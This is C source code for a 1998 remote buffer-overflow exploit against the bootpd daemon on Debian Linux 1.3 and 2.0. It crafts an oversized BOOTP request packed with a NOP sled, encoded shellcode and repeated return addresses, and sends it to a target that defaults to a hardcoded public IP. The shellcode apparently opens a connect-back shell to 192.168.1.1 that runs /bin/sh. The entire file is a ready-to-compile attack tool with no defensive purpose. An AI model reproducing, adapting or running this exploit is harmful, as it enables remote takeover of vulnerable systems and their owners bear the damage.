/*
 * Bootpd Exploit against debian linux 1.3 and 2.0 and possibly other
 *
 * (C) 1998  Willem Pinckaers W.H.J.Pinckaers@cpedu.rug.nl
 *
 *
 * Broken ass code fixed by Bronc Buster - Dec 1998
 *
 * If you get this and it's missing the two .h files
 * just forget it (unless you are lucky and have them already)
 * Anyone with half a brain could of fixed this to work, so if
 * you are using this now, either I gave it to you, or you are
 * a k0d3 kIdDi3 ;)
 *
 * to complie: gcc bootpd.c -o bootp
 * 
 */

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "bootp.h"
#define MAX_MSG_SIZE 500

char shellcode[] =
"\x31" "\xc9" "\x89" "\xc8" "\x04" "\x66" "\x41" "\x89" "\xca" "\x89" "\xcb"
"\xeb" "\x7f" "\x5f" "\x89" "\x4f" "\x08" "\x41" "\x89" "\x4f" "\x04" "\x80"
"\xc1" "\x04" "\x89" "\x4f" "\x0c" "\x8d" "\x4f" "\x04" "\xcd" "\x80" "\x89"
"\x07" "\x31" "\xc9" "\x80" "\xc1" "\x02" "\x66" "\x89" "\x4f" "\x0c" "\x66"
"\x89" "\x4f" "\x0e" "\x80" "\xc1" "\x0e" "\x66" "\x89" "\x4f" "\x08" "\x66"
"\xb9" "\x30" "\x39" "\x66" "\x89" "\x4f" "\x0e" "\x8d" "\x47" "\x0c" "\x89"
"\x47" "\x04" "\x31" "\xc9" "\xb1" "\x03" "\x89" "\xca" "\x89" "\xcb" "\x89"
"\xf9" "\x31" "\xc0" "\x04" "\x66" "\xcd" "\x80" "\x31" "\xc0" "\x89" "\xc1"
"\x04" "\x3f" "\x89" "\xc2" "\x8b" "\x1f" "\xcd" "\x80" "\x89" "\xd0" "\x41"
"\xcd" "\x80" "\x89" "\xd0" "\x41" "\xcd" "\x80" "\x31" "\xc0" "\x89" "\x47"
"\x10" "\x88" "\x47" "\x1b" "\x8d" "\x47" "\x14" "\x89" "\x47" "\x0c" "\x31"
"\xc0" "\x04" "\x0b" "\x8d" "\x5f" "\x14" "\x8d" "\x4f" "\x0c" "\x8d" "\x57"
"\x10" "\xcd" "\x80" "\x31" "\xc0" "\x40" "\xcd" "\x80" "\xe8" "\x7c" "\xff"
"\xff" "\xff" "\x2e" "\x41" "\x41" "\x41" "\x41" "\x41" "\x41" "\x41" "\x41"
"\x41" "\x41" "\x41" "\x41" "\x41" "\x39" "\x30" "\xc0" "\xa8" "\x01" "\x01"
"\x2f" "\x62" "\x69" "\x6e" "\x2f" "\x73" "\x68" "\x00";

#define SERVER_PORT     67

char client_addr[16] = "127.000.000.001";
char host_addr[16] = "207.053.133.005";
int realpath_adjust = 0;
int exploit_length = 1200;


struct sockaddr_in server_addr;
void sendpacket(int, struct bootp *);
void build_packet(struct bootp *, int, char**);
void get_args(int, char**);
void usage(void);

int main(int argc, char *argv[])
{
    struct bootp* bp;
    int s;

    get_args(argc, argv);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(host_addr);


    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        fprintf(stderr, "cannot create socket\n");
        exit(1);
    }
    if ((bp = (struct bootp*) malloc(MAX_MSG_SIZE + 1000)) == NULL) {
        (void) fprintf(stderr, "Cannot malloc.\n");
        exit(1);
    };
    (void) memset(bp, 0, MAX_MSG_SIZE + 1000); /* ai exploit isn't secure */
    build_packet(bp, argc, argv);

    sendpacket(s, bp);
}

void sendpacket(int s, struct bootp *bp)
{
    if (sendto(s, (const void *) bp, MAX_MSG_SIZE, 0,
      (const struct sockaddr *) &server_addr,
      sizeof(struct sockaddr_in)) == -1) {
        fprintf(stderr, "sendpacket: sendto returned -1 ;(\n");
        exit(1);
    }
}

void build_packet(struct bootp *bp, int argc, char *argv[])
{
    unsigned long start_realpath = 0xbffff684 + realpath_adjust;
    unsigned long addr_ret_addr = start_realpath + 8 + 0x488;
    unsigned long temp_addr, temp_addr2 = 0;
    int length_tftpdir = 1;    // no ftpdir just a slash at the start..
    int num_nops = 600;
    char *p;
    unsigned long *q;
    int i;

    bp->bp_op = BOOTREQUEST;
    bp->bp_xid = 58524;
    bp->bp_htype = HTYPE_ETHERNET;
    bp->bp_hlen = 6;
    bp->bp_ciaddr.s_addr = inet_addr(client_addr);

    printf("Using: client: %s\n", client_addr);
    printf("Using: server: %s\n", host_addr);
    printf("Addr of realpath: %x\n", start_realpath);
    p = bp->bp_file;
/* Putting in nops */
    for (i = 0; i < num_nops; i++)
        *p++ = 0x90;
    printf("Added: %d nops\n", num_nops);

/* Putting in shellcode */
    for(i = 0; i < strlen(shellcode); i++)
        *p++ = shellcode[i];
    printf("%d bytes of shellcode added.\n", strlen(shellcode));

/* Aligning to make sure the ret_addr is placed correctly */
    temp_addr = p - bp->bp_file + length_tftpdir + start_realpath;
    for(i = 0; i < (addr_ret_addr - temp_addr) % 4; i++)
        *p++ = 'a';
    printf("%d bytes of alignment added.\n", (addr_ret_addr - temp_addr) %4);

/* set return adress.. hopefully in exploit code.... */
    temp_addr2 = start_realpath + length_tftpdir + (num_nops / 2);
    if (!(temp_addr2 & 0xff)) temp_addr2++;
    printf("Setting return addr to: %x \n", temp_addr2);
    q = (unsigned long *) p;
    do {
        *q++ = temp_addr2;
        p = (char *) q;
    } while ((p - bp->bp_file) < exploit_length);
    *p++ = '\0';
   printf("Exploit length: %d \n", strlen(bp->bp_file));
}

void get_args(int argc, char *argv[])
{
    int ch;
    while ((ch = getopt(argc, argv, "c:s:a:e:")) != EOF) {
        switch(ch) {
            case 'c':
                strcpy(client_addr, optarg);
                break;
            case 's':
                strcpy(host_addr, optarg);
                break;
            case 'a':
                realpath_adjust = atoi(optarg);
                break;
            case 'e':
                exploit_length = atoi(optarg);
                break;
            default:
                usage();
        }
    }
}

void usage(void)
{
    printf("bootpd exploit against debian linux 1.3 and 2.0 (probably others)\n");
    printf("\nBy Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl) 1998\n");
    printf("\nUsage:\n\tbootpd: -c client_addr -s server_addr -a offset\n");
    exit(1);
}
